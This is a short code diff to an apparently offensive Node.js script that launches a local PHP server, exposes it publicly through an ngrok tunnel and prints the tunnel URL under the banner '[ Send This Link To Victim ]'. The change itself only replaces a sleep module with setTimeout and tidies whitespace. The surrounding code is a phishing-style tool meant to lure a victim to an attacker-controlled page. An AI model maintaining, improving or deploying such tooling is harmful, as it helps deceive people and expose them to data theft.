@@ -12,7 +12,6 @@ var style = require("chalk");
 var notif = require("beeper");
 var check = require("log-symbols")
 var cow = require("cowsay")
-var s = require('sleep')
 
 // Cowsay :)
 console.log(cow.say({
@@ -30,18 +29,19 @@ console.log(style.bgBlue("[IG] fajar_firdaus_7"))
 console.log(style.bgBlue("[YT] iTech7732"))
 console.log(c.rainbow("[:———————————————————:]"))
 
-// Create user input interface 
+// Create user input interface
 
 // Create php local server
 cmd.exec("php -S 127.0.0.1:3200 > /dev/null 2>&1 & ");
-	
+
 // Make online php server by port forwarding
 cmd.exec("./ngrok http 3200 > /dev/null 2>&1 &");
 
 console.log(style.bgBlue("[/] Please Wait... :)"))
 
 
-s.sleep(5)
+setTimeout(() => {
+
 // Tell user if server already start
 console.log(c.blue("[ Send This Link To Victim ] > " + cmd.exec("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-z]*\.ngrok.io'")));
 
@@ -65,3 +65,4 @@ var js = JSON.parse(body);
 
 });
 });
+}, 4000);
